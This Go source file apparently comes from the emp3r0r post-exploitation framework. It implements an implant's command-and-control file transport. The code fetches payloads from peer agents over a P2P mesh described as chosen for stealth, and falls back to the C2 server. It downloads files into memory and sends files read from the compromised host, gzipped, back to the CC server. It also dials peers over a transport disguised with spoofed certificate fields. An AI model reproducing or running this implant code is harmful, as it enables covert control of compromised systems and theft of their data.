package c2transport

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// FetchFile download via P2P mesh transfer, if path is empty, return []byte instead
// This will try to download from other agents for better speed and stealth
// when fail, will automatically fall back to downloading from CC
func FetchFile(config *def.Config, peer, file_to_download, path, checksum string) (data []byte, err error) {
	if util.IsFileExist(path) {
		// check checksum
		data, err = util.ReadFileAgent(path)
		if err == nil {
			if checksum == "" || crypto.SHA256SumRaw(data) == checksum {
				logging.Infof("FetchFile: %s already exists and checksum matches", path)
				return data, nil
			}
		}
	}

	// if peer is given, try P2P mesh transfer from peer agent first
	if peer != "" {
		logging.Infof("FetchFile: attempting P2P download of %s from peer %s", file_to_download, peer)
		data, err = FetchFilePeer(peer, file_to_download, path, checksum)
		if err == nil {
			logging.Infof("FetchFile: successfully downloaded %s from peer %s over P2P mesh", file_to_download, peer)
			return data, nil
		}
		logging.Warningf("FetchFile: P2P download from %s failed (%v), falling back to C2 server", peer, err)
	}

	// Fallback to C2 server
	return DownloadViaC2(config, file_to_download, path, checksum)
}

// DownloadViaC2 download via EmpHTTPClient
// if path is empty, return []data instead
func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) (data []byte, err error) {
	// The download URL carries the filename as a query param for the server to serve.
	// Routing is done via CBOR MsgAuth capability "www" — not URL path.
	downloadURL := def.CCAddress + "?file_to_download=" + url.QueryEscape(file_to_download)
	logging.Infof("DownloadViaCC is downloading from %s", downloadURL)
	retData := false
	if path == "" {
		retData = true
		logging.Infof("No path specified, will return []byte")
	}
	// For non-mem paths, use a lock file to prevent racing downloads
	if !retData && !strings.HasPrefix(path, "mem:") {
		lock := fmt.Sprintf("%s.lock", path)
		if util.IsFileExist(lock) {
			err = fmt.Errorf("%s already being downloaded", downloadURL)
			return data, err
		}
		util.CreateFileAgent(lock)
		defer os.RemoveAll(lock)
	}

	// connect to CC
	conn, _, cancel, err := EstablishC2Connection(def.CCAddress, file_to_download, common.RuntimeConfig.C2Routes.WWW)
	if err != nil {
		err = fmt.Errorf("DownloadViaC2 EstablishC2Connection: %v", err)
		return data, err
	}
	defer cancel()
	defer conn.Close()
	secureConn := transport.NewSecureConn(conn)

	// download to memory
	if retData {
		logging.Infof("Downloading %s to memory", file_to_download)
		data, err = io.ReadAll(secureConn)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC read body: %v", err)
			return nil, err
		}
		if c := crypto.SHA256SumRaw(data); checksum != "" && c != checksum {
			err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", c, checksum)
			return nil, err
		}
		return data, nil
	}

	// download to file (or memfs)
	logging.Infof("Downloading %s to %s", file_to_download, path)

	// Always read into memory first — this correctly handles both mem: and disk paths
	// via WriteFileAgent, avoiding any direct os.OpenFile on mem:/// paths.
	data, err = io.ReadAll(secureConn)
	if err != nil {
		return nil, fmt.Errorf("DownloadViaC2 read: %v", err)
	}

	if checksum != "" {
		if c := crypto.SHA256SumRaw(data); c != checksum {
			return nil, fmt.Errorf("DownloadViaC2 checksum failed: %s != %s", c, checksum)
		}
	}

	if err = util.WriteFileAgent(path, data, 0o600); err != nil {
		return nil, fmt.Errorf("DownloadViaC2 write: %v", err)
	}

	return nil, nil
}

// SendFile2CC send file to CC, with buffering
// using FTP API
func SendFile2CC(filepath string, offset int64, token string) (err error) {
	logging.Infof("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	data, err := util.ReadFileAgent(filepath)
	if err != nil {
		err = fmt.Errorf("failed to open %s: %v", filepath, err)
		return err
	}

	if offset > int64(len(data)) {
		err = fmt.Errorf("offset %d > file size %d", offset, len(data))
		return err
	}
	data = data[offset:]

	conn, _, _, err := EstablishC2Connection(def.CCAddress, token, common.RuntimeConfig.C2Routes.FTP)
	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)
	if err != nil {
		err = fmt.Errorf("connection failed: %v", err)
		return err
	}

	// Create a debug wrapper
	secureConn := transport.NewSecureConn(conn)
	defer secureConn.Close()

	// open compressor
	compressor := gzip.NewWriter(secureConn)
	if err != nil {
		err = fmt.Errorf("failed to open compressor: %v", err)
		return err
	}
	defer compressor.Close()

	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
	copyBuf := make([]byte, 1024*1024)
	n, err := io.CopyBuffer(compressor, bytes.NewReader(data), copyBuf)
	if err != nil {
		logging.Infof("failed, %d bytes transfered: %v", n, err)
	}
	return err
}

// AgentFileTransferSessions stores active file transfer sessions between agents
var AgentFileTransferSessions sync.Map

var (
	// FileServer switch (kept for API compat, file serving is now done in mesh/bridge.go)
	FileServerCtx    context.Context
	FileServerCancel context.CancelFunc
)

// FetchFilePeer downloads a file directly from a peer agent using the existing
// P2P relay transport (OpcodeFileRequest on KCPServerPort). No tunnel, no HTTP.
// Returns the file bytes, saving them to path if non-empty.
func FetchFilePeer(peerIP, file_to_download, path, checksum string) (data []byte, err error) {
	addr := fmt.Sprintf("%s:%s", peerIP, common.RuntimeConfig.KCPServerPort)

	// Dial using the same transport that ServeRelay uses
	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
	if t == nil {
		return nil, fmt.Errorf("FetchFilePeer: transport %q not found", common.RuntimeConfig.P2PTransport)
	}
	if camo, ok := t.(*transport.CamouflageMTLS); ok {
		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
	}

	conn, err := t.Dial(addr, common.RuntimeConfig.Password, def.MagicString)
	if err != nil {
		return nil, fmt.Errorf("FetchFilePeer dial %s: %v", addr, err)
	}
	defer conn.Close()

	// Send opcode
	if _, err = conn.Write([]byte{0x03}); err != nil { // OpcodeFileRequest
		return nil, fmt.Errorf("FetchFilePeer send opcode: %v", err)
	}

	// Send 4-byte LE filename length + filename
	name := []byte(file_to_download)
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(name)))
	if _, err = conn.Write(lenBuf); err != nil {
		return nil, fmt.Errorf("FetchFilePeer send name len: %v", err)
	}
	if _, err = conn.Write(name); err != nil {
		return nil, fmt.Errorf("FetchFilePeer send name: %v", err)
	}

	// Read response byte
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	resp := make([]byte, 1)
	if _, err = io.ReadFull(conn, resp); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read response: %v", err)
	}

	if resp[0] == 0xFF { // OpcodeErr
		errLenBuf := make([]byte, 2)
		io.ReadFull(conn, errLenBuf)
		msgLen := binary.LittleEndian.Uint16(errLenBuf)
		msg := make([]byte, msgLen)
		io.ReadFull(conn, msg)
		return nil, fmt.Errorf("FetchFilePeer: peer error: %s", string(msg))
	}
	if resp[0] != 0x00 { // OpcodeOK
		return nil, fmt.Errorf("FetchFilePeer: unexpected response 0x%02x", resp[0])
	}

	// Read 4-byte LE data length
	dataLenBuf := make([]byte, 4)
	if _, err = io.ReadFull(conn, dataLenBuf); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read data len: %v", err)
	}
	dataLen := binary.LittleEndian.Uint32(dataLenBuf)
	conn.SetDeadline(time.Now().Add(5 * time.Minute)) // generous for large files

	// Read all data
	data = make([]byte, dataLen)
	if _, err = io.ReadFull(conn, data); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read data: %v", err)
	}
	conn.SetDeadline(time.Time{})

	// Verify checksum
	if checksum != "" {
		if c := crypto.SHA256SumRaw(data); c != checksum {
			return nil, fmt.Errorf("FetchFilePeer checksum mismatch: got %s want %s", c, checksum)
		}
	}

	logging.Infof("FetchFilePeer: got %d bytes of %s from %s", dataLen, file_to_download, peerIP)

	// Save to path if requested
	if path != "" {
		if err = util.WriteFileAgent(path, data, 0o600); err != nil {
			return nil, fmt.Errorf("FetchFilePeer write: %v", err)
		}
		logging.Infof("FetchFilePeer: saved %s to %s", file_to_download, path)
		return nil, nil
	}
	return data, nil
}

// CancelFileTransfer cancels an ongoing file transfer session
func CancelFileTransfer(clientAddr, filepath string) {
	sessionID := fmt.Sprintf("%s:%s", clientAddr, filepath)

	if val, exists := AgentFileTransferSessions.Load(sessionID); exists {
		cancel := val.(context.CancelFunc)
		cancel()
		logging.Infof("File transfer session for %s canceled", sessionID)
		AgentFileTransferSessions.Delete(sessionID)
	} else {
		logging.Infof("No active file transfer session for %s", sessionID)
	}
}
